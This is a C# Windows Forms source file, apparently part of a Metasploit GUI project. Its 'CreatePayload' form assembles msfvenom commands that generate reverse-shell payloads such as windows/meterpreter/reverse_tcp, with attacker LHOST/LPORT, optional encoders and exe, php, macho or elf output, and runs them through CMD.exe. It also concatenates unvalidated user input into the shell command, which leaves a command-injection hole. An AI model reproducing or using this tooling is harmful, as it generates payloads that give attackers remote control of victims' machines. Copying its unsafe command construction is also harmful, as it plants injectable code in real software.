using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Metasploit_GUI
{
    public partial class CreatePayload : Form
    {
        public string filetype;
        public CreatePayload()
        {
            InitializeComponent();
        }

        private void CreatePayload_Load(object sender, EventArgs e)
        {
            UpdateHost();
        }

        public void UpdateHost()
        {
            textBox1.Text = Options.lhost;
            textBox2.Text = Options.lport.ToString();
        }

        static public void UpdateHostFromSpace()
        {
            //new CreatePayload cp; //byg vidrer
            CreatePayload cp = new CreatePayload();
            cp.UpdateHost();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new Options().Show();
        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            Console.WriteLine(comboBox1.SelectedIndex);
            int index = comboBox1.SelectedIndex;
            if(index == 0 || index == 1)
            {
                label3.Text = "Windows";
                filetype = "exe";
            }
            if(index == 2)
            {
                label3.Text = "Webserver: Windows, Linux";
                filetype = "raw";
            }
            if(index == 3)
            {
                label3.Text = "OS X";
                filetype = "macho";
            }
            if(index == 4)
            {
                label3.Text = "OS X, Linux";
                filetype = "elf";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            //msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
            string strCmdText;
            if (comboBox2.SelectedItem == "none")
            {
                strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " LHOST=" + Options.lhost + " LPORT=" + Options.lport + " -f " + filetype + " -o " + saveLocation.Text;
            }
            else
            {
                strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " -e " + comboBox2.SelectedItem + " LHOST=" + Options.lhost + " LPORT=" + Options.lport + " -f " + filetype + " -o " + saveLocation.Text;
                //strCmdText = "/C msfvenom -p " + comboBox1.SelectedItem + " -e "+ comboBox2.SelectedItem + " && pause";
            }
            //strCmdText = "/C msfvenom -p "+comboBox1.SelectedItem;
            Console.WriteLine(strCmdText);
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);
        }

        private void button3_Click(object sender, EventArgs e)
        {
            int index = comboBox1.SelectedIndex;
            if (index == 0 || index == 1)
            {
                saveFileDialog1.DefaultExt = "exe";
                saveFileDialog1.Filter = "Executables (*.exe)|*.exe|All files (*.*)|*.*";
            }
            if (index == 2)
            {
                saveFileDialog1.DefaultExt = "php";
                saveFileDialog1.Filter = "PHP: Hypertext Preprocessor (*.php)|*.php|Text-files (*.txt)|*.txt|All files (*.*)|*.*";
            }
            if (index == 3)
            {

            }
            saveFileDialog1.ShowDialog();
            saveLocation.Text = saveFileDialog1.FileName;
        }
    }
}
